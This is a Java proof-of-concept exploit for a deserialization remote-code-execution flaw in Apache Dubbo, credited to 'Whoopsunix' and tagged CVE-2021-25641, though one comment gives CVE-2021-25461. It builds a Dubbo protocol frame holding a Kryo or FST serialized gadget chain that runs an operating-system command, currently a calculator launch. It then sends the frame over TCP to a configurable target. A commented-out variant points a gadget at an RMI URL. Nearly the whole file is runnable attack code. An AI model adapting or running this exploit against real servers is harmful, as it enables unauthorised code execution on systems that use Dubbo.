package org.example;

import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.ObjectOutput;
import org.apache.dubbo.common.serialize.Serialization;
import org.apache.dubbo.common.serialize.fst.FstObjectOutput;
import org.apache.dubbo.common.serialize.fst.FstSerialization;
import org.apache.dubbo.common.serialize.kryo.KryoObjectOutput;
import org.apache.dubbo.common.serialize.kryo.KryoSerialization;
import org.apache.dubbo.rpc.RpcInvocation;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.Socket;

/**
 * @author Whoopsunix
 *
 * CVE-2021-25461
 */
public class CVE_2021_25641 {
    // Customize URL for remote targets
    public static String DUBBO_HOST_NAME = "localhost";
    //    public static int    DUBBO_HOST_PORT = 20880;
    public static int    DUBBO_HOST_PORT = 12345;

    // OS-specific payloads - comment to switch OS variants
    // exploit will print "whoops!" on server console either way
    public static String DUBBO_RCE_COMMAND = "open -a Calculator.app"; // Linux
//    public static String DUBBO_RCE_COMMAND = "calc"; // Windows

    //Exploit variant - comment to switch exploit variants
    public static String EXPLOIT_VARIANT = "Kryo";
//    public static String EXPLOIT_VARIANT = "FST";

    // Magic header from ExchangeCodec
    protected static final short MAGIC = (short) 0xdabb;
    protected static final byte MAGIC_HIGH = Bytes.short2bytes(MAGIC)[0];
    protected static final byte MAGIC_LOW = Bytes.short2bytes(MAGIC)[1];

    // Message flags from ExchangeCodec
    protected static final byte FLAG_REQUEST = (byte) 0x80;
    protected static final byte FLAG_TWOWAY = (byte) 0x40;

    public static void main(String[] args) throws Exception{
        // encode request data.
        ByteArrayOutputStream bos = new ByteArrayOutputStream();

        // Kryo exploit variant
        Serialization s;
        ObjectOutput objectOutput;
        switch(EXPLOIT_VARIANT) {
            case "FST":
                s = new FstSerialization();
                objectOutput = new FstObjectOutput(bos);
                break;
            case "Kryo":
            default:
                s = new KryoSerialization();
                objectOutput = new KryoObjectOutput(bos);
                break;
        }

        // 0xc2 is Hessian2 + two-way + Request serialization
        // Kryo | two-way | Request is 0xc8 on third byte
        // FST | two-way | Request is 0xc9 on third byte

        byte requestFlags =  (byte) (FLAG_REQUEST | s.getContentTypeId() | FLAG_TWOWAY);
        byte[] header = new byte[]{MAGIC_HIGH, MAGIC_LOW, requestFlags,
                0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; // Padding and 0 length LSBs
        bos.write(header);
        // Strings need only satisfy "readUTF" calls until "readObject" is reached, so garbage metadata works too
        /*
        objectOutput.writeUTF("notAversion");
        objectOutput.writeUTF("notAservice");
        objectOutput.writeUTF("notAserviceVersion");
        objectOutput.writeUTF("notAmethod");
        objectOutput.writeUTF("notAtype"); //*/

        // This section contains valid data writes
        RpcInvocation ri = new RpcInvocation();
        ri.setParameterTypes(new Class[] {Object.class, Method.class, Object.class});
        //ri.setParameterTypesDesc("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        ri.setArguments(new Object[] { "sayHello", new String[] {"org.example.api.DemoService"}, new Object[] {"YOU"}});
        // Strings need only satisfy "readUTF" calls until "readObject" is reached

        // /*
        objectOutput.writeUTF("2.0.2");
        objectOutput.writeUTF("org.example.api.DemoService");
        objectOutput.writeUTF("0.0.0");
        objectOutput.writeUTF("sayHello");
        objectOutput.writeUTF("Ljava/lang/String;"); //*/

        objectOutput.writeObject(GadgetBuilder.fastjson(DUBBO_RCE_COMMAND));
//        objectOutput.writeObject(GadgetBuilder.romePayload("rmi://127.0.0.1:1099/sfwouu"));
        objectOutput.writeObject(ri.getAttachments());

        objectOutput.flushBuffer();
        byte[] payload = bos.toByteArray();
        int len = payload.length - header.length;
        Bytes.int2bytes(len, payload, 12);

        // Dubbo Message Stream Hex Dump
        for (int i = 0; i < payload.length; i++) {
            System.out.print(String.format("%02X", payload[i]) + " ");
            if ((i + 1) % 8 == 0)
                System.out.print(" ");
            if ((i + 1) % 16 == 0 )
                System.out.println();

        }
        // Payload string
        System.out.println();
        System.out.println(new String(payload));

        Socket pingSocket = null;
        OutputStream out = null;
        // Send request over TCP socket
        try {
            pingSocket = new Socket(DUBBO_HOST_NAME, DUBBO_HOST_PORT);
            out = pingSocket.getOutputStream();
        } catch (IOException e) {
            return;
        }
        out.write(payload);
        out.flush();
        out.close();
        pingSocket.close();
        System.out.println("Sent!");
    }
}
